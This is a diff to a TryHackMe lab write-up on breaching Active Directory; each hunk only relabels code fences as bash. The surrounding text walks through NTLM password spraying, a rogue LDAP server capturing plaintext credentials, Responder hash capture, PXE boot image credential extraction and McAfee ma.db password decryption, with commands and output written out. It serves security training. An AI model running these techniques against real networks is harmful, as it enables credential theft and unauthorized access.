@@ -47,7 +47,7 @@ Connecting to the Network
 If you are using the Web-based AttackBox, you will be connected to the network automatically if you start the AttackBox from the room's page. You can verify this by running the ping command against the IP of the THMDC.za.tryhackme.com host. We do still need to configure DNS, however. Windows Networks use the Domain Name Service (DNS) to resolve hostnames to IPs. Throughout this network, DNS will be used for the tasks. You will have to configure DNS on the host on which you are running the VPN connection. In order to configure our DNS, run the following command:
 
   Terminal 
-```Terminal 
+```bash
 [thm@thm]$ sed -i '1s|^|nameserver $THMDCIP\n|' /etc/resolv-dnsmasq
 ```
 
@@ -70,7 +70,7 @@ If you are going to use your own attack machine, an OpenVPN configuration file w
 Use an OpenVPN client to connect. This example is shown on a Linux machine; similar guides to connect using Windows or macOS can be found at your [access](https://tryhackme.com/access) page.
 
   Terminal 
-```Terminal 
+```bash
 [thm@thm]$ sudo openvpn breachingad.ovpn
 Fri Mar 11 15:06:20 2022 OpenVPN 2.4.9 x86_64-redhat-linux-gnu [SSL (OpenSSL)] [LZO] [LZ4] [EPOLL] [PKCS11] [MH/PKTINFO] [AEAD] built on Apr 19 2020
 Fri Mar 11 15:06:20 2022 library versions: OpenSSL 1.1.1g FIPS  21 Apr 2020, LZO 2.08
@@ -256,7 +256,7 @@ We provide the following values for each of the parameters:
 Using these parameters, we should get a few valid credentials pairs from our password spraying attack.
 
    NTLM Password Spraying Attack  
-```NTLM Password Spraying Attack 
+```bash
 [thm@thm]$ python3 ntlm_passwordspray.py -u usernames.txt -f za.tryhackme.com -p Changeme123 -a http://ntlmauth.za.tryhackme.com/
 [*] Starting passwords spray attack using the following password: Changeme123
 [-] Failed login with Username: anthony.reynolds
@@ -347,7 +347,7 @@ Note that if you use the AttackBox, the you should first disable slapd using `se
 You should see that we get a connection back, but there is a slight problem:
 
    Netcat LDAP Listener  
-```Netcat LDAP Listener 
+```bash
 [thm@thm]$ nc -lvp 389
 listening on [any] 389 ...
 10.10.10.201: inverse host lookup failed: Unknown host
@@ -409,7 +409,7 @@ Move old database files before a new one is created:
 Before using the rogue LDAP server, we need to make it vulnerable by downgrading the supported authentication mechanisms. We want to ensure that our LDAP server only supports PLAIN and LOGIN authentication methods. To do this, we need to create a new ldif file, called with the following content:
 
    olcSaslSecProps.ldif  
-```olcSaslSecProps.ldif 
+```bash
 #olcSaslSecProps.ldif
 dn: cn=config
 replace: olcSaslSecProps
@@ -429,7 +429,7 @@ sudo ldapmodify -Y EXTERNAL -H ldapi:// -f ./olcSaslSecProps.ldif && sudo servic
 ```
 
 We can verify that our rogue LDAP server's configuration has been applied using the following command (**Note** : If you are using Kali, you may not receive any output, however the configuration should have worked and you can continue with the next steps):   LDAP search to verify supported authentication mechanisms  
-```LDAP search to verify supported authentication mechanisms 
+```bash
 [thm@thm]$ ldapsearch -H ldap:// -x -LLL -s base -b "" supportedSASLMechanisms
 dn:
 supportedSASLMechanisms: PLAIN
@@ -440,7 +440,7 @@ Capturing LDAP Credentials
 Our rogue LDAP server has now been configured. When we click the "Test Settings" at [http://printer.za.tryhackme.com/settings.aspx](http://printer.za.tryhackme.com/settings.aspx), the authentication will occur in clear text. If you configured your rogue LDAP server correctly and it is downgrading the communication, you will receive the following error: "This distinguished name contains invalid syntax". If you receive this error, you can use a tcpdump to capture the credentials using the following command:
 
    TCPDump  
-```TCPDump 
+```bash
 [thm@thm]$ sudo tcpdump -SX -i breachad tcp port 389
 tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
 listening on eth1, link-type EN10MB (Ethernet), snapshot length 262144 bytes
@@ -541,7 +541,7 @@ Responder has already been installed on the AttackBox. However, if you are not u
 If you are using the AttackBox not all of the Responder services will be able to start since other services are already using those ports. However, this will not impact this task. Responder will now listen for any LLMNR, NBT-NS, or WPAD requests that are coming in. We would leave Responder to run for a bit on a real LAN. However, in our case, we have to simulate this poisoning by having one of the servers attempt to authenticate to machines on the VPN. Leave Responder running for a bit (average 10 minutes, get some fresh air!), and you should receive an SMBv2 connection which Responder can use to entice and extract an NTLMv2-SSP response. It will look something like this:
 
    NTLM Password Spraying Attack  
-```NTLM Password Spraying Attack 
+```bash
 [+] Listening for events...
 [SMBv2] NTLMv2-SSP Client   : <Client IP>
 [SMBv2] NTLMv2-SSP Username : ZA\<Service Account Username>
@@ -641,7 +641,7 @@ and the password of `Password1@`.
 To ensure that all users of the network can use SSH, start by creating a folder with your username and copying the powerpxe repo into this folder:
 
    SSH Command Prompt  
-```SSH Command Prompt 
+```bash
 C:\Users\THM>cd Documents
 C:\Users\THM\Documents> mkdir <username>
 C:\Users\THM\Documents> copy C:\powerpxe <username>\
@@ -649,13 +649,13 @@ C:\Users\THM\Documents\> cd <username>
 ```
 
 The first step we need to perform is using TFTP and downloading our BCD file to read the configuration of the MDT server. TFTP is a bit trickier than FTP since we can't list files. Instead, we send a file request, and the server will connect back to us via UDP to transfer the file. Hence, we need to be accurate when specifying files and file paths. The BCD files are always located in the /Tmp/ directory on the MDT server. We can initiate the TFTP transfer using the following command in our SSH session:   SSH Command Prompt  
-```SSH Command Prompt 
+```bash
 C:\Users\THM\Documents\Am0> tftp -i <THMMDT IP> GET "\Tmp\x64{39...28}.bcd" conf.bcd
 Transfer successful: 12288 bytes in 1 second(s), 12288 bytes/s
 ```
 
 You will have to lookup THMMDT IP with `nslookup thmmdt.za.tryhackme.com`. With the BCD file now recovered, we will be using [powerpxe](https://github.com/wavestone-cdt/powerpxe) to read its contents. Powerpxe is a PowerShell script that automatically performs this type of attack but usually with varying results, so it is better to perform a manual approach. We will use the Get-WimFile function of powerpxe to recover the locations of the PXE Boot images from the BCD file:   SSH Command Prompt  
-```SSH Command Prompt 
+```bash
 C:\Users\THM\Documents\Am0> powershell -executionpolicy bypass
 Windows PowerShell
 Copyright (C) Microsoft Corporation. All rights reserved.   
@@ -669,7 +669,7 @@ PS C:\Users\THM\Documents\am0> Get-WimFile -bcdFile $BCDFile
 ```
 
 WIM files are bootable images in the Windows Imaging Format (WIM). Now that we have the location of the PXE Boot image, we can again use TFTP to download this image:   SSH Command Prompt  
-```SSH Command Prompt 
+```bash
 PS C:\Users\THM\Documents\am0> tftp -i <THMMDT IP> GET "<PXE Boot Image Location>" pxeboot.wim
 Transfer successful: 341899611 bytes in 218 second(s), 1568346 bytes/s
 ```
@@ -681,7 +681,7 @@ Now that we have recovered the PXE Boot image, we can exfiltrate stored credenti
 Again we will use powerpxe to recover the credentials, but you could also do this step manually by extracting the image and looking for the bootstrap.ini file, where these types of credentials are often stored. To use powerpxe to recover the credentials from the bootstrap file, run the following command:
 
    SSH Command Prompt  
-```SSH Command Prompt 
+```bash
 PS C:\Users\THM\Documents\am0> Get-FindCredentials -WimFile pxeboot.wim
 >> Open pxeboot.wim
 >>>> Finding Bootstrap.ini
@@ -747,7 +747,7 @@ McAfee embeds the credentials used during installation to connect back to the or
 The ma.db file is stored in a fixed location:
 
    SSH Command Prompt  
-```SSH Command Prompt 
+```bash
 thm@THMJMP1 C:\Users\THM>cd C:\ProgramData\McAfee\Agent\DB
 thm@THMJMP1 C:\ProgramData\McAfee\Agent\DB>dir
  Volume in drive C is Windows 10
@@ -765,7 +765,7 @@ thm@THMJMP1 C:\ProgramData\McAfee\Agent\DB>dir
  We can use SCP to copy the ma.db to our AttackBox:
 
    Terminal  
-```Terminal 
+```bash
 thm@thm:~/thm# scp thm@THMJMP1.za.tryhackme.com:C:/ProgramData/McAfee/Agent/DB/ma.db .
 thm@10.200.4.249's password:
 ma.db 100%  118KB 144.1KB/s   00:00
@@ -774,7 +774,7 @@ ma.db 100%  118KB 144.1KB/s   00:00
  To read the database file, we will use a tool called sqlitebrowser. We can open the database using the following command:
 
    Terminal  
-```Terminal 
+```bash
 thm@thm:# sqlitebrowser ma.db
 ```
 
@@ -789,7 +789,7 @@ We are particularly interested in the second entry focusing on the DOMAIN, AUTH_
 You will have to unzip the mcafee-sitelist-pwd-decryption.zip file:
 
    Terminal  
-```Terminal 
+```bash
 thm@thm:~/root/Rooms/BreachingAD/task7/$ unzip mcafeesitelistpwddecryption.zip
 ```
 
@@ -798,7 +798,7 @@ thm@thm:~/root/Rooms/BreachingAD/task7/$ unzip mcafeesitelistpwddecryption.zip
 By providing the script with our base64 encoded and encrypted password, the script will provide the decrypted password:
 
    Terminal  
-```Terminal 
+```bash
 thm@thm:~/root/Rooms/BreachingAD/task7/mcafee-sitelist-pwd-decryption-master$ python2 mcafee_sitelist_pwd_decrypt.py <AUTH PASSWD VALUE>
 Crypted password   : <AUTH PASSWD VALUE>
 Decrypted password : <Decrypted Pasword>
